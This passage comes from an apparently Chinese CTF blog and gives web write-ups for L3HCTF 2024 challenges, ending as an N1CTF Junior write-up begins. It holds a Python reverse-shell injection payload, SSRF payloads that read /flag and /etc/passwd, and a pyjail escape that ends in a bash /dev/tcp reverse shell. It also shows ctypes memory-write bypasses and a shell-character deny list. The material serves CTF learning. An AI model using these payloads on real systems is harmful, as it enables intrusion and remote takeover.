class="hljs-string">&quot;utf-8&quot;</span>)</span></span><span class="hljs-function">        <span class="hljs-title">os</span>.<span class="hljs-title">remove</span><span class="hljs-params">(filename + <span class="hljs-string">&#x27;.py&#x27;</span>)</span></span><span class="hljs-function">        <span class="hljs-title">print</span><span class="hljs-params">(result)</span></span><span class="hljs-function">        <span class="hljs-title">if</span><span class="hljs-params">(result.endswith(correctstr+<span class="hljs-string">&quot;!&quot;</span>))</span>:</span><span class="hljs-function">            <span class="hljs-title">return</span> <span class="hljs-title">flask</span>.<span class="hljs-title">jsonify</span><span class="hljs-params">(<span class="hljs-string">&quot;Correct!flag is &quot;</span>+flag)</span></span><span class="hljs-function">        <span class="hljs-title">else</span>:</span><span class="hljs-function">            <span class="hljs-title">return</span> <span class="hljs-title">flask</span>.<span class="hljs-title">jsonify</span><span class="hljs-params">(<span class="hljs-string">&quot;Wrong!&quot;</span>)</span></span><span class="hljs-function">    <span class="hljs-title">except</span>:</span><span class="hljs-function">        <span class="hljs-title">os</span>.<span class="hljs-title">remove</span><span class="hljs-params">(filename + <span class="hljs-string">&#x27;.py&#x27;</span>)</span></span><span class="hljs-function">        <span class="hljs-title">return</span> <span class="hljs-title">flask</span>.<span class="hljs-title">jsonify</span><span class="hljs-params">(<span class="hljs-string">&quot;Timeout!&quot;</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"><span class="hljs-title">if</span> <span class="hljs-title">__name__</span> == &#x27;<span class="hljs-title">__main__</span>&#x27;:</span><span class="hljs-function">    <span class="hljs-title">app</span>.<span class="hljs-title">run</span><span class="hljs-params">(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)</span></span></code></pre></div><p>把输入的内容替换到codehere中</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> oscodes=<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">&lt;&lt;codehere&gt;&gt;</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre></div><p>这里可以造成逃逸，确实是非预期</p><p>闭合前面，补全后面</p><div class="code-wrapper"><pre><code class="hljs asciidoc">&#x27;&#x27;&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;host&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);                  exit(0)                  &#x27;&#x27;&#x27;</code></pre></div><h2 id="short-url"><a href="#short-url" class="headerlink" title="short-url"></a>short-url</h2><p>unknown 牛B</p><p>其实难度不高，但反正我没看了</p><p><img src="/../images/L3HCTF-WEB/image-20240207005941893.png" alt="image-20240207005941893"></p><p><img src="/../images/L3HCTF-WEB/image-20240207010002305.png" alt="image-20240207010002305"></p><p><img src="/../images/L3HCTF-WEB/image-20240207010111334.png" alt="image-20240207010111334"></p><p>页面只有一个link参数，限定了http协议，尝试输入自己的vps地址，开启监听都没反应</p><p>那应该是个SSRF</p><p>并且不管我们输入什么值，都会返回</p><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com/jump?redirect=随机字符</code></pre></div><p>这些随机字符为键值对里的键，存储着对应的link的值</p><p>看到test路由，</p><p><img src="/../images/L3HCTF-WEB/image-20240207011439092.png" alt="image-20240207011439092"></p><p>会获取键值对的值，所以我们应得到一个有效的redirect后传给他</p><p>并且他所存储的link的值中不应该有url参数，</p><p>有也可以，但是有url参数的话，要验证host必须为<code>www.example.com</code></p><p>不然无法通过Fetch函数获取该链接的内容</p><p>private路由限制RemoteAddr为127.0.0.1，才能获取指定url的内容</p><p>那这里也就是说要<code>http://127.0.0.1</code></p><p>这里就可以配合上面的SSRF，再加上private路由可以传一个叫url的参数</p><p>当然这里有个Intercepter，用;或者&#x2F;即可</p><div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-regexp">/private 变成 /</span><span class="hljs-keyword">private</span>/ <span class="hljs-regexp">/private 变成 /</span><span class="hljs-keyword">private</span>;</code></pre></div><p><img src="/../images/L3HCTF-WEB/image-20240207175837634.png" alt="image-20240207175837634"></p><h3 id="给一下解题步骤"><a href="#给一下解题步骤" class="headerlink" title="给一下解题步骤"></a>给一下解题步骤</h3><p>后面根据做法整理一下思路</p><p><img src="/../images/L3HCTF-WEB/image-20240205033618821.png" alt="image-20240205033618821"></p><p><img src="/../images/L3HCTF-WEB/image-20240205033630269.png" alt="image-20240205033630269"></p><p><img src="/../images/L3HCTF-WEB/image-20240205033654647.png" alt="image-20240205033654647"></p><h3 id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h3><p>首先</p><p><img src="/../images/L3HCTF-WEB/image-20240205033618821.png" alt="image-20240205033618821"></p><p>这是没有问题了</p><p>获取到一个键名</p><p>然后通过jump路由作中间人</p><p><img src="/../images/L3HCTF-WEB/image-20240205033630269.png" alt="image-20240205033630269"></p><p><img src="/../images/L3HCTF-WEB/image-20240207015100547.png" alt="image-20240207015100547"></p><p>根据解题步骤，访问<code>http://ip:port/jump?redirect=随机字符</code>响应的内容是<code>http://127.0.0.1:8080/private;?url=file:///flag</code></p><p>所以test路由检查他的键值为<code>http://ip:port/jump?redirect=获取的新值</code>，并没有url参数</p><p>所以通过Fetch<code>http://ip:port/jump?redirect=获取的新值</code>会重定向到<code>http://127.0.0.1:8080/private;?url=file:///flag</code>由此获取flag</p><p>可能表达不太好，将就着看吧</p><p><a href="https://mp.weixin.qq.com/s/KHeSnJMUXAc_fV8Jpvg3uA">L3HCTF 2024 - Nep WP (qq.com)</a>意思跟它想表达的差不多</p><h3 id="官方WP"><a href="#官方WP" class="headerlink" title="官方WP"></a>官方WP</h3><p>官方是直接从private到test的，这样的话就要检查参数url的host是否为<code>www.example.com</code></p><p>可以利用<code>org.springframework.web.util.UriComponents</code>拼接多个相同param的特点，将url拆分为两部分</p><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/private/</span>?url=file:<span class="hljs-regexp">//</span>www.example.com&amp;url=@/flag</code></pre></div><p>得到的redirect传给test即可</p><h3 id="S1uM4i-WP-不太懂"><a href="#S1uM4i-WP-不太懂" class="headerlink" title="S1uM4i WP  不太懂"></a>S1uM4i WP  不太懂</h3><p>也是直接从private到test的</p><div class="code-wrapper"><pre><code class="hljs Plain">http://127.0.0.1:8080/private;?url=file://www.example.com////etc/passwd</code></pre></div><p>往协议头里面塞，转到 private 的时候会自动过一层 url 解码，变成 <code>Fetch(&quot;file:///etc/passwd?://www.example.com/&quot;);</code></p><p>payload</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8080</span>/private;?url=%<span class="hljs-number">66</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>f://www.example.com/</code></pre></div><h2 id="intractable-problem-revenge"><a href="#intractable-problem-revenge" class="headerlink" title="intractable problem revenge"></a>intractable problem revenge</h2><p>python沙箱懂不了一点</p><p>随便写点笔记吧，然后给出其他战队WP</p><blockquote><p>题目设置了一个python沙箱，禁用了builtins，同时禁止了<code>__</code>从而禁止了通过继承链进行逃逸，还利用python审计事件禁止了通过gc等获取沙箱外对象，同时禁用了sys、os、open等风险功能。</p></blockquote><p>禁用builtins的代码大概是这样</p><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">eval</span><span class="hljs-params">(code, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span></span>或<span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">(code, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: None&#125;)</span></span></code></pre></div><p>由于我们使用的函数基本上都在<code>__builtins__</code>中，</p><p>所以我们要逃逸沙箱，获取到沙箱外的<code>__globals__</code></p><h3 id="S1uM4i-WP"><a href="#S1uM4i-WP" class="headerlink" title="S1uM4i WP"></a>S1uM4i WP</h3><p><a href="https://gist.github.com/lebr0nli/c2c0f42757f05813e3282c22114abe82">https://gist.github.com/lebr0nli/c2c0f42757f05813e3282c22114abe82</a></p><div class="code-wrapper"><pre><code class="hljs Python">a = []g = ((g.gi_frame.f_back.f_back, gl:=g.gi_frame.f_back.f_back.f_globals) <span class="hljs-keyword">for</span> g <span class="hljs-keyword">in</span> a)a.append(g)g.send(<span class="hljs-literal">None</span>)</code></pre></div><p>后续是这个原题</p><p><a href="https://github.com/maple3142/My-CTF-Challenges/blob/master/TSJ%20CTF%202022/Just%20a%20pyjail/README.md">https://github.com/maple3142/My-CTF-Challenges/blob/master/TSJ%20CTF%202022/Just%20a%20pyjail/README.md</a></p><p>主要是要修改offset的处理，不能通过io交互，直接本地生成一个marshal数据，之后观察构造，replace处理即可</p><div class="code-wrapper"><pre><code class="hljs Python">a = []g = ((g.gi_frame.f_back.f_back, gl:=g.gi_frame.f_back.f_back.f_globals) <span class="hljs-keyword">for</span> g <span class="hljs-keyword">in</span> a)a.append(g)g.send(<span class="hljs-literal">None</span>)b = gl[<span class="hljs-string">&#x27;_&#x27;</span> <span class="hljs-string">&#x27;_builtins_&#x27;</span> <span class="hljs-string">&#x27;_&#x27;</span>]<span class="hljs-built_in">object</span> = b.<span class="hljs-built_in">object</span><span class="hljs-built_in">bytearray</span> = b.<span class="hljs-built_in">bytearray</span><span class="hljs-built_in">id</span> = b.<span class="hljs-built_in">id</span><span class="hljs-built_in">print</span> = b.<span class="hljs-built_in">print</span><span class="hljs-built_in">bytes</span> = b.<span class="hljs-built_in">bytes</span><span class="hljs-built_in">input</span> = b.<span class="hljs-built_in">input</span><span class="hljs-built_in">len</span> = b.<span class="hljs-built_in">len</span><span class="hljs-built_in">hex</span> = b.<span class="hljs-built_in">hex</span>importer = b.<span class="hljs-built_in">getattr</span>(b, <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span> + <span class="hljs-string">&quot;loader&quot;</span> + <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span>)<span class="hljs-built_in">print</span>(importer)marshal = importer.load_module(<span class="hljs-string">&quot;marshal&quot;</span>)<span class="hljs-keyword">def</span> <span class="hljs-title function_">p64</span>(<span class="hljs-params">addr</span>):    <span class="hljs-keyword">return</span> addr.to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;little&quot;</span>)const_tuple = ()fake_bytearray = <span class="hljs-built_in">bytearray</span>(    p64(<span class="hljs-number">0x41414141</span>)    + p64(<span class="hljs-built_in">id</span>(<span class="hljs-built_in">bytearray</span>))  <span class="hljs-comment"># ob_refcnt</span>    + p64(<span class="hljs-number">0x7FFFFFFFFFFFFFFF</span>)  <span class="hljs-comment"># ob_type</span>    + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># ob_size (INT64_MAX)</span>    + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># ob_alloc (doesn&#x27;t seem to really be used?)</span>    + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># *ob_bytes (start at address 0)</span>    + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># *ob_start (ditto)  # ob_exports (not really sure what this does)</span>)fake_bytearray_ptr_addr = <span class="hljs-built_in">id</span>(fake_bytearray) + <span class="hljs-number">0x20</span>const_tuple_array_start = <span class="hljs-built_in">id</span>(const_tuple) + <span class="hljs-number">0x18</span>offset = (fake_bytearray_ptr_addr - const_tuple_array_start) // <span class="hljs-number">8</span><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Offset:&quot;</span>, offset)<span class="hljs-keyword">def</span> <span class="hljs-title function_">dummy</span>():    <span class="hljs-keyword">pass</span>tt = <span class="hljs-string">b&#x27;e3000000000000000000000000000000000000000040000000f30a00000090aa90bb90cc64dd5300a9007202000000720200000072020000007202000000da00720300000000000000f300000000&#x27;</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">i2h</span>(<span class="hljs-params">x</span>):    <span class="hljs-keyword">global</span> b    <span class="hljs-keyword">return</span> b.<span class="hljs-built_in">hex</span>(x)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;0&quot;</span>).encode()tt = tt.replace(<span class="hljs-string">b&quot;aa&quot;</span>, i2h((offset &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>)).replace(<span class="hljs-string">b&quot;bb&quot;</span>, i2h((offset &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>)).replace(<span class="hljs-string">b&quot;cc&quot;</span>, i2h((offset &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>)).replace(<span class="hljs-string">b&quot;dd&quot;</span>, i2h((offset &gt;&gt; <span class="hljs-number">0</span>) &amp; <span class="hljs-number">0xFF</span>))<span class="hljs-built_in">print</span>(tt)bs = <span class="hljs-built_in">bytes</span>.fromhex(tt.decode())co = marshal.loads(bs)b.<span class="hljs-built_in">setattr</span>(dummy, <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span> + <span class="hljs-string">&quot;code&quot;</span> + <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span>, co)magic = dummy()<span class="hljs-comment"># sanity check</span><span class="hljs-built_in">print</span>(magic[<span class="hljs-built_in">id</span>(<span class="hljs-string">&quot;peko&quot;</span>) : <span class="hljs-built_in">id</span>(<span class="hljs-string">&quot;peko&quot;</span>) + <span class="hljs-number">64</span>])target_strs = [    <span class="hljs-string">&quot;import&quot;</span>,    <span class="hljs-string">&quot;spawn&quot;</span>,    <span class="hljs-string">&quot;process&quot;</span>,    <span class="hljs-string">&quot;os&quot;</span>,    <span class="hljs-string">&quot;sys&quot;</span>,    <span class="hljs-string">&quot;cpython&quot;</span>,    <span class="hljs-string">&quot;fork&quot;</span>,    <span class="hljs-string">&quot;open&quot;</span>,    <span class="hljs-string">&quot;interpreter&quot;</span>,    <span class="hljs-string">&quot;ctypes&quot;</span>,    <span class="hljs-string">&quot;compile&quot;</span>,    <span class="hljs-string">&quot;gc&quot;</span>,    <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span> + <span class="hljs-string">&quot;new&quot;</span> + <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span>,]<span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> target_strs:    addr = <span class="hljs-built_in">id</span>(s)    magic[addr + <span class="hljs-number">48</span> : addr + <span class="hljs-number">48</span> + <span class="hljs-built_in">len</span>(s)] = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-built_in">len</span>(s)os = b.<span class="hljs-built_in">getattr</span>(b, <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span> + <span class="hljs-string">&quot;import&quot;</span> + <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span>)(<span class="hljs-string">&quot;os&quot;</span>)os.system(<span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/1234 0&gt;&amp;1&quot;&#x27;</span>)factorization = <span class="hljs-keyword">lambda</span> x: (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)</code></pre></div><h4 id="自己生成观察一下规律"><a href="#自己生成观察一下规律" class="headerlink" title="自己生成观察一下规律"></a>自己生成观察一下规律</h4><p>根据原题给出的生成marshal序列化的代码，找一下规律</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> marshal<span class="hljs-keyword">from</span> dis <span class="hljs-keyword">import</span> opmap<span class="hljs-keyword">from</span> <span class="hljs-keyword">types</span> <span class="hljs-keyword">import</span> CodeType<span class="hljs-keyword">offset</span> = <span class="hljs-number">314894131665789</span>     #手动修改，找规律bc = bytes(    [        opmap[&quot;EXTENDED_ARG&quot;],        (<span class="hljs-keyword">offset</span> &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>,        opmap[&quot;EXTENDED_ARG&quot;],        (<span class="hljs-keyword">offset</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>,        opmap[&quot;EXTENDED_ARG&quot;],        (<span class="hljs-keyword">offset</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>,        opmap[&quot;LOAD_CONST&quot;],        (<span class="hljs-keyword">offset</span> &gt;&gt; <span class="hljs-number">0</span>) &amp; <span class="hljs-number">0xFF</span>,        opmap[&quot;RETURN_VALUE&quot;],        <span class="hljs-number">0</span>,    ])code = CodeType(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bc, (), (), (), &quot;&quot;, &quot;&quot;, <span class="hljs-number">0</span>, b&quot;&quot;)print(marshal.dumps(code).hex().encode())</code></pre></div><p>多次改变offset的值，对比生成的数据可以发现规律</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">e3000000000000000000000000000000000000000040000000f30a00000090</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> <span class="hljs-number">00</span> <span class="hljs-number">64</span> <span class="hljs-number">01</span> <span class="hljs-number">5300</span>a9007202000000720200000072020000007202000000da00720300000000000000f300000000<span class="hljs-attribute">e3000000000000000000000000000000000000000040000000f30a00000090</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> <span class="hljs-number">00</span> <span class="hljs-number">64</span> <span class="hljs-number">02</span> <span class="hljs-number">5300</span>a9007202000000720200000072020000007202000000da00720300000000000000f300000000<span class="hljs-attribute">e3000000000000000000000000000000000000000040000000f30a00000090</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> <span class="hljs-number">00</span> <span class="hljs-number">64</span> <span class="hljs-number">03</span> <span class="hljs-number">5300</span>a9007202000000720200000072020000007202000000da00720300000000000000f300000000<span class="hljs-attribute">e3000000000000000000000000000000000000000040000000f30a00000090</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> <span class="hljs-number">04</span> <span class="hljs-number">90</span> c3 <span class="hljs-number">64</span> f8 <span class="hljs-number">5300</span>a9007202000000720200000072020000007202000000da00720300000000000000f300000000<span class="hljs-attribute">e3000000000000000000000000000000000000000040000000f30a00000090</span> <span class="hljs-number">28</span> <span class="hljs-number">90</span> <span class="hljs-number">88</span> <span class="hljs-number">90</span> <span class="hljs-number">15</span> <span class="hljs-number">64</span> <span class="hljs-number">77</span> <span class="hljs-number">5300</span>a9007202000000720200000072020000007202000000da00720300000000000000f300000000<span class="hljs-attribute">e3000000000000000000000000000000000000000040000000f30a00000090</span> <span class="hljs-number">53</span> <span class="hljs-number">90</span> <span class="hljs-number">93</span> <span class="hljs-number">90</span> d9 <span class="hljs-number">64</span> <span class="hljs-number">53</span> <span class="hljs-number">5300</span>a9007202000000720200000072020000007202000000da00720300000000000000f300000000<span class="hljs-attribute">e3000000000000000000000000000000000000000040000000f30a00000090</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> dc <span class="hljs-number">90</span> <span class="hljs-number">1</span>b <span class="hljs-number">64</span> <span class="hljs-number">7</span>d <span class="hljs-number">5300</span>a9007202000000720200000072020000007202000000da00720300000000000000f300000000</code></pre></div><p>不同的部分从前到后，分别代表<code>(offset &gt;&gt; 24) &amp; 0xFF</code>，<code>(offset &gt;&gt; 16) &amp; 0xFF</code>，<code>(offset &gt;&gt; 8) &amp; 0xFF</code>，<code>(offset &gt;&gt; 0) &amp; 0xFF</code></p><p>所以payload中把不同部分用aa,bb,cc,dd表示，最后replace替换掉</p><div class="code-wrapper"><pre><code class="hljs 1c">tt = b&#x27;e<span class="hljs-number">30000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000004</span><span class="hljs-number">000000</span>0f30a<span class="hljs-number">00000090</span>aa90bb90cc64dd<span class="hljs-number">5300</span>a<span class="hljs-number">90072020000007</span><span class="hljs-number">20200000072020</span><span class="hljs-number">00000720200000</span>0da<span class="hljs-number">00720300000000</span><span class="hljs-number">000000</span>f<span class="hljs-number">30000000</span>0&#x27;def i2h(x):    global b    return b.hex(x)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;0&quot;</span>).encode()    <span class="hljs-meta">#使长度为2，不足时用0填充</span>tt = tt.replace(b<span class="hljs-string">&quot;aa&quot;</span>, i2h((offset &gt;&gt; <span class="hljs-number">24</span>) <span class="hljs-meta">&amp; 0xFF)).replace(b&quot;bb&quot;, i2h((offset &gt;&gt; 16) &amp; 0xFF)).replace(b&quot;cc&quot;, i2h((offset &gt;&gt; 8) &amp; 0xFF)).replace(b&quot;dd&quot;, i2h((offset &gt;&gt; 0) &amp; 0xFF))</span></code></pre></div><h3 id="官方WP-1"><a href="#官方WP-1" class="headerlink" title="官方WP"></a>官方WP</h3><p>可以用python的栈帧对象逃逸出沙箱从而获取到沙箱外的globals</p><div class="code-wrapper"><pre><code class="hljs Python">a=(a.gi_frame.f_back.f_back <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>])a=[x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a][<span class="hljs-number">0</span>]<span class="hljs-built_in">globals</span>=a.f_back.f_back.f_globals</code></pre></div><p>可以注意到在判断答案是否正确时的globals与沙箱内获取到的globals相同，因此可以想办法破坏判断的过程绕过答案校验。一个可行的方法是替换掉int函数，使python在校验时使用我们给出的数据进行校验，payload如下：</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">factorization</span>(<span class="hljs-params">n</span>):    a=(a.gi_frame.f_back.f_back <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>])    a=[x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a][<span class="hljs-number">0</span>]    <span class="hljs-built_in">globals</span>=a.f_back.f_back.f_globals    builtin = <span class="hljs-built_in">globals</span>[<span class="hljs-string">&quot;_&quot;</span> + <span class="hljs-string">&quot;_builtins_&quot;</span> + <span class="hljs-string">&quot;_&quot;</span>]        <span class="hljs-keyword">def</span> <span class="hljs-title function_">fakeint</span>(<span class="hljs-params">i</span>):        <span class="hljs-keyword">if</span>(builtin.<span class="hljs-built_in">len</span>(i)&gt;<span class="hljs-number">100</span>):            <span class="hljs-keyword">return</span> <span class="hljs-number">123123</span>*<span class="hljs-number">123123</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">return</span> <span class="hljs-number">123123</span>    builtin.<span class="hljs-built_in">int</span>=fakeint    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span></code></pre></div><p>W&amp;M也是替换掉int</p><p>此外还有另一种解题方法，CPython中的字符串对象引用C底层堆中一个PyASCIIObject内存实体，相同的字符串具有同一个实体，所以我们可以利用ctypes库实现内存的任意读写，替换内存中字符串指向的值，从而替换掉最终进行校验的数值。注意import在此题中因为os和open无法使用，可以通过<code>__loader__.load_module</code>进行加载，同时PyASCIIObject的头部长度为48，我们需要对有效负载进行改写。payload如下：</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">factorization</span>(<span class="hljs-params">n</span>):    a=(a.gi_frame.f_back.f_back <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>])    a=[x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a][<span class="hljs-number">0</span>]    <span class="hljs-built_in">globals</span>=a.f_back.f_back.f_globals    builtin=<span class="hljs-string">&quot;_&quot;</span> + <span class="hljs-string">&quot;_builtins_&quot;</span> + <span class="hljs-string">&quot;_&quot;</span>    builtin=<span class="hljs-built_in">globals</span>[builtin]    ctypes=builtin.<span class="hljs-built_in">getattr</span>(builtin, <span class="hljs-string">&quot;_&quot;</span> + <span class="hljs-string">&quot;_loader_&quot;</span> + <span class="hljs-string">&quot;_&quot;</span>).load_module(<span class="hljs-string">&quot;ctypes&quot;</span>)    <span class="hljs-built_in">id</span>=builtin.<span class="hljs-built_in">id</span>    <span class="hljs-built_in">ord</span>=builtin.<span class="hljs-built_in">ord</span>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">writemem</span>(<span class="hljs-params">addr,value</span>):        p=ctypes.pointer(ctypes.pointer(ctypes.c_char(<span class="hljs-number">0</span>)))        p.contents=ctypes.c_longlong(addr)        p.contents.contents.value=value    addr=<span class="hljs-built_in">id</span>(n)    res=<span class="hljs-string">&#x27;1&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">1232</span>    point=<span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:        writemem(addr+<span class="hljs-number">48</span>+point,<span class="hljs-built_in">ord</span>(i))        point+=<span class="hljs-number">1</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>**<span class="hljs-number">616</span>,<span class="hljs-number">10</span>**<span class="hljs-number">616</span></code></pre></div><p>另有其他多种解法，如获取到内存对象后查找内存确定输出标识符位置、通过上述方法篡改hook函数中字符串绕过hook、通过inspect读栈帧代码输出正确字符串等方式，python使用极其灵活，本题有多种不同的逃逸思路。</p><p>啊这，会不了一点。。。。。。。。</p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>两个有能力做，一个想不到，还有一个完全不会。。。</p><p>。。。学完了，跟没学一样，学不到东西啊</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://s1um4i-official.feishu.cn/docx/QeGGdeyuhoR6kuxCOj8c44wRnne">https://s1um4i-official.feishu.cn/docx/QeGGdeyuhoR6kuxCOj8c44wRnne</a></p><p><a href="https://hust-l3hsec.feishu.cn/docx/MZ8SdwSoPo3cBTxOxbGcuUBun4c">‌⁡⁤⁤‌⁡﻿﻿⁡‬⁡⁢⁣‌‬⁣⁤‬‬‍⁤﻿⁤﻿﻿⁤⁡⁢‌⁣﻿‬‬‍﻿‬⁢‍⁢⁢⁡L3HCTF 2024 Official WriteUp - 飞书云文档 (feishu.cn)</a></p><p><a href="https://mp.weixin.qq.com/s/KHeSnJMUXAc_fV8Jpvg3uA">L3HCTF 2024 - Nep WP (qq.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第二届N1CTF Junior-Web</title>
    <link href="/2024/02/06/%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF-Junior-Web/"/>
    <url>/2024/02/06/%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF-Junior-Web/</url>
    
    <content type="html"><![CDATA[<h1 id="第二届N1CTF-Junior-复现"><a href="#第二届N1CTF-Junior-复现" class="headerlink" title="第二届N1CTF-Junior 复现"></a>第二届N1CTF-Junior 复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>好好好，又爆零，最简单的都弄不出来，废了</p><h2 id="zako"><a href="#zako" class="headerlink" title="zako"></a>zako</h2><p>Lolita大佬出的题</p><p><img src="/../images/%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF-Junior-Web/image-20240206231404532.png" alt="image-20240206231404532"></p><p><img src="/../images/%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF-Junior-Web/image-20240206231507994.png" alt="image-20240206231507994"></p><div class="code-wrapper"><pre><code class="hljs stata">#!/bin/bashreject()&#123;    echo <span class="hljs-variable">$&#123;1&#125;</span>    <span class="hljs-keyword">exit</span> 1&#125;XXXCMD=<span class="hljs-variable">$1</span>awk -v str=<span class="hljs-string">&quot;$&#123;XXXCMD&#125;&quot;</span> \&#x27;BEGIN&#123;    deny=<span class="hljs-string">&quot;`;&amp;$()&#123;&#125;[]!@#$%^&amp;*-&quot;</span>;    <span class="hljs-keyword">for</span>(i = 1; i &lt;= <span class="hljs-built_in">length</span>(str); i++)&#123;        <span class="hljs-keyword">char</span> = <span class="hljs-built_in">substr</span>(str, i, 1);        <span class="hljs-keyword">for</span>(x = 1; x &lt; <span class="hljs-built_in">length</span>(deny)+1; x++)&#123;            r = <span class="hljs-built_in">substr</span>(deny, x, 1);            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">char</span> == r) <span class="hljs-keyword">exit</span> 1;        &#125;    &#125;&#125;&#x27;[ $? -ne 0 ] &amp;&amp; reject <span class="hljs-string">&quot;NOT ALLOW 1&quot;</span>eval_cmd=`echo <span class="hljs-string">&quot;$&#123;XXXCMD&#125;&quot;</span> | awk -F <span class="hljs-string">&quot;|&quot;</span> \&#x27;BEGIN&#123;    allows[1] = <span class="hljs-string">&quot;ls&quot;</span>;    allows[2] = <span class="hljs-string">&quot;makabaka&quot;</span>;    allows[3] = <span class="hljs-string">&quot;whoareu&quot;</span>;    allows[4] = <span class="hljs-string">&quot;cut~no&quot;</span>;    allows[5] = <span class="hljs-string">&quot;grep&quot;</span>;    allows[6] = <span 